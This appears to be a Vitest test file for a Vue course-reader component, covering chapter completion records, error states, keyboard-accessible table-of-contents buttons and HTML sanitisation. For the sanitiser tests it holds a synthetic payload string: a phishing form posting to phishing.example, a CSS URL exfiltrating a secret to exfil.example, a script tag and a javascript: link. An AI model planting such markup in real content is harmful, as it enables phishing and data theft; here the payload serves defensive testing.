import { describe, expect, it, vi, beforeEach } from 'vitest'
import { mount, flushPromises } from '@vue/test-utils'

const chapterApi = vi.hoisted(() => ({ getChapters: vi.fn(), getChapterById: vi.fn() }))
const learningRecordApi = vi.hoisted(() => ({
  createLearningRecord: vi.fn(),
  getMyLearningRecords: vi.fn(),
}))

vi.mock('@/api/chapter', () => ({ default: chapterApi }))
vi.mock('@/api/learningRecord', () => ({ default: learningRecordApi }))

const toast = vi.hoisted(() => vi.fn())
vi.mock('../composables/ui', () => ({
  useUi: () => ({ toast }),
}))

import ReaderTab from '../views/course/tabs/ReaderTab.vue'

const COURSE_ID = 4007

const chaptersPayload = {
  data: [
    { id: 6101, title: '绪论', content: '<p>第一章正文</p>', isPublished: true, taskCount: 2 },
    { id: 6102, title: '协议分层', content: '<p>第二章正文</p>', isPublished: true },
  ],
}

function mountReader() {
  return mount(ReaderTab, { props: { courseId: COURSE_ID } })
}

const findButton = (wrapper: ReturnType<typeof mount>, label: string) =>
  wrapper.findAll('button').find((node) => node.text().includes(label))

const doneButton = (wrapper: ReturnType<typeof mount>) => {
  const buttons = wrapper.findAll('.reader-actions button')
  return buttons[buttons.length - 1]
}

/** 让 createLearningRecord 悬停，便于断言重复点击不会二次提交 */
function deferred() {
  let resolve: (value: unknown) => void = () => {}
  let reject: (reason: unknown) => void = () => {}
  const promise = new Promise((res, rej) => {
    resolve = res
    reject = rej
  })
  return { promise, resolve, reject }
}

beforeEach(() => {
  vi.clearAllMocks()
  toast.mockReset()
  chapterApi.getChapters.mockResolvedValue(chaptersPayload)
  chapterApi.getChapterById.mockResolvedValue({ data: {} })
  learningRecordApi.getMyLearningRecords.mockResolvedValue({ data: [] })
  learningRecordApi.createLearningRecord.mockResolvedValue({ data: {} })
})

describe('学生阅读列 · 标记完成', () => {
  it('按后端契约提交章节级 COMPLETE 学习记录，成功后进入已完成态并禁止重复提交', async () => {
    const pending = deferred()
    learningRecordApi.createLearningRecord.mockReturnValueOnce(pending.promise)

    const wrapper = mountReader()
    await flushPromises()

    await doneButton(wrapper)?.trigger('click')
    await flushPromises()

    // 字段取自 LearningRecord：courseId / chapterId / actionType / duration
    expect(learningRecordApi.createLearningRecord).toHaveBeenCalledTimes(1)
    expect(learningRecordApi.createLearningRecord).toHaveBeenCalledWith({
      courseId: COURSE_ID,
      chapterId: 6101,
      actionType: 'COMPLETE',
      duration: 0,
    })
    // 提交中：按钮锁定，重复点击不得二次写入
    expect(doneButton(wrapper)?.attributes('disabled')).toBeDefined()
    await doneButton(wrapper)?.trigger('click')
    await flushPromises()
    expect(learningRecordApi.createLearningRecord).toHaveBeenCalledTimes(1)

    pending.resolve({ data: {} })
    await flushPromises()

    expect(toast).toHaveBeenCalledWith('本章已标记完成', 'ok')
    expect(doneButton(wrapper)?.text()).toContain('已完成')
    expect(doneButton(wrapper)?.attributes('disabled')).toBeDefined()

    await doneButton(wrapper)?.trigger('click')
    await flushPromises()
    expect(learningRecordApi.createLearningRecord).toHaveBeenCalledTimes(1)
    wrapper.unmount()
  })

  it('挂载时从 GET /learning-records 还原本章已完成态，只认本课程的 COMPLETE 记录', async () => {
    learningRecordApi.getMyLearningRecords.mockResolvedValue({
      data: [
        // 同章节但只是进度上报，不算完成
        { id: 1, courseId: COURSE_ID, chapterId: 6101, actionType: 'PROGRESS', duration: 120 },
        // 同章节、COMPLETE，但属于别的课程，不算
        { id: 2, courseId: 9999, chapterId: 6101, actionType: 'COMPLETE', duration: 0 },
        // 本课程另一章节的完成记录
        { id: 3, courseId: COURSE_ID, chapterId: 6102, actionType: 'COMPLETE', duration: 0 },
      ],
    })

    const wrapper = mountReader()
    await flushPromises()

    expect(learningRecordApi.getMyLearningRecords).toHaveBeenCalledTimes(1)
    expect(doneButton(wrapper)?.text()).toContain('标记完成')
    expect(doneButton(wrapper)?.attributes('disabled')).toBeUndefined()

    // 切到已完成章节：按钮直接呈现已完成，不再提交
    await wrapper.findAll('.chapter-item')[1].trigger('click')
    await flushPromises()
    expect(doneButton(wrapper)?.text()).toContain('已完成')
    expect(doneButton(wrapper)?.attributes('disabled')).toBeDefined()
    wrapper.unmount()
  })

  it('提交失败给 danger toast，按钮保持可重试', async () => {
    learningRecordApi.createLearningRecord.mockRejectedValueOnce(new Error('502'))

    const wrapper = mountReader()
    await flushPromises()

    await doneButton(wrapper)?.trigger('click')
    await flushPromises()

    expect(toast).toHaveBeenCalledWith('标记完成失败，请稍后重试', 'danger')
    expect(doneButton(wrapper)?.text()).toContain('标记完成')
    expect(doneButton(wrapper)?.attributes('disabled')).toBeUndefined()

    await doneButton(wrapper)?.trigger('click')
    await flushPromises()

    expect(learningRecordApi.createLearningRecord).toHaveBeenCalledTimes(2)
    expect(doneButton(wrapper)?.text()).toContain('已完成')
    wrapper.unmount()
  })

  it('学习记录读数失败不改变章节与正文行为，只保持未完成态', async () => {
    learningRecordApi.getMyLearningRecords.mockRejectedValueOnce(new Error('500'))

    const wrapper = mountReader()
    await flushPromises()

    expect(wrapper.text()).toContain('绪论')
    expect(wrapper.find('.reader-content').text()).toContain('第一章正文')
    expect(wrapper.text()).not.toContain('章节接口不可达')
    expect(doneButton(wrapper)?.text()).toContain('标记完成')
    expect(doneButton(wrapper)?.attributes('disabled')).toBeUndefined()
    wrapper.unmount()
  })

  it('章节列表加载失败仍走原有失败态，不出现可提交的假章节', async () => {
    chapterApi.getChapters.mockRejectedValueOnce(new Error('500'))

    const wrapper = mountReader()
    await flushPromises()

    expect(wrapper.text()).toContain('该课程还没有章节。')
    expect(wrapper.text()).toContain('章节接口不可达；旧版学习中心仍可使用。')
    expect(doneButton(wrapper)?.attributes('disabled')).toBeDefined()
    await doneButton(wrapper)?.trigger('click')
    await flushPromises()
    expect(learningRecordApi.createLearningRecord).not.toHaveBeenCalled()
    wrapper.unmount()
  })

  it('章节正文加载失败仍是 danger toast，且不影响标记完成入口', async () => {
    chapterApi.getChapters.mockResolvedValueOnce({
      data: [{ id: 6101, title: '绪论', isPublished: true }],
    })
    chapterApi.getChapterById.mockRejectedValueOnce(new Error('502'))

    const wrapper = mountReader()
    await flushPromises()

    expect(chapterApi.getChapterById).toHaveBeenCalledWith(6101)
    expect(toast).toHaveBeenCalledWith('章节正文加载失败，请稍后重试', 'danger')
    expect(findButton(wrapper, '标记完成')).toBeTruthy()
    wrapper.unmount()
  })
})

/**
 * F-1／F-4：正文净化档位与目录项的可操作性。
 * 样本是合成字符串（不是真实课件），逐条对应处置前后的差量构造。
 */
describe('学生阅读列 · 正文净化与目录键盘可达', () => {
  const POLLUTED =
    '<p class="lead">正常正文</p>' +
    '<form action="https://phishing.example/login"><input name="password"></form>' +
    '<div style="background:url(https://exfil.example/collect?d=secret)">外带</div>' +
    '<script>alert(1)</script>' +
    '<a href="javascript:alert(2)">点我</a>'

  it('列表接口带回的正文按 sanitize 档位渲染：表单／内联样式／脚本／伪协议一律不进 DOM', async () => {
    chapterApi.getChapters.mockResolvedValueOnce({
      data: [{ id: 6101, title: '绪论', content: POLLUTED, isPublished: true, taskCount: 1 }],
    })

    const wrapper = mountReader()
    await flushPromises()

    const html = wrapper.find('.reader-content').html()
    expect(html).toContain('正常正文')
    expect(html).toContain('class="lead"')
    expect(html).not.toContain('<form')
    expect(html).not.toContain('phishing.example')
    expect(html).not.toContain('<input')
    expect(html).not.toContain('style=')
    expect(html).not.toContain('exfil.example')
    expect(html).not.toContain('<script')
    expect(html).not.toContain('javascript:')
    wrapper.unmount()
  })

  it('按需读取的单章正文走同一条净化路（第二个调用点不是漏网的）', async () => {
    chapterApi.getChapters.mockResolvedValueOnce({
      data: [{ id: 6101, title: '绪论', isPublished: true }],
    })
    chapterApi.getChapterById.mockResolvedValueOnce({ data: { content: POLLUTED } })

    const wrapper = mountReader()
    await flushPromises()

    expect(chapterApi.getChapterById).toHaveBeenCalledWith(6101)
    const html = wrapper.find('.reader-content').html()
    expect(html).toContain('正常正文')
    expect(html).not.toContain('<form')
    expect(html).not.toContain('<input')
    expect(html).not.toContain('style=')
    expect(html).not.toContain('<script')
    wrapper.unmount()
  })

  it('目录项是真正的 button：可聚焦、Enter/Space 由 UA 转成 click，且不带 href', async () => {
    // 聚焦断言要求节点在 document 里（默认挂载是脱离文档的），故挂进一个临时容器
    const host = document.createElement('div')
    document.body.appendChild(host)
    const wrapper = mount(ReaderTab, { props: { courseId: COURSE_ID }, attachTo: host })
    await flushPromises()

    // F-4 前这里是 <a href="javascript:void(0)">：位点清单与伪协议都不该再出现
    expect(wrapper.findAll('.toc-panel a')).toHaveLength(0)
    const items = wrapper.findAll('.toc-panel button')
    expect(items).toHaveLength(2)
    for (const item of items) {
      expect(item.attributes('type')).toBe('button')
      expect(item.attributes('href')).toBeUndefined()
    }

    const second = items[1].element as HTMLButtonElement
    second.focus()
    expect(document.activeElement).toBe(second)

    // 键盘激活在浏览器里由 UA 转成 click 事件，这里用原生 click() 复现同一条路径
    second.click()
    await flushPromises()
    expect(wrapper.find('.reader-panel h2').text()).toContain('协议分层')
    wrapper.unmount()
    host.remove()
  })
})
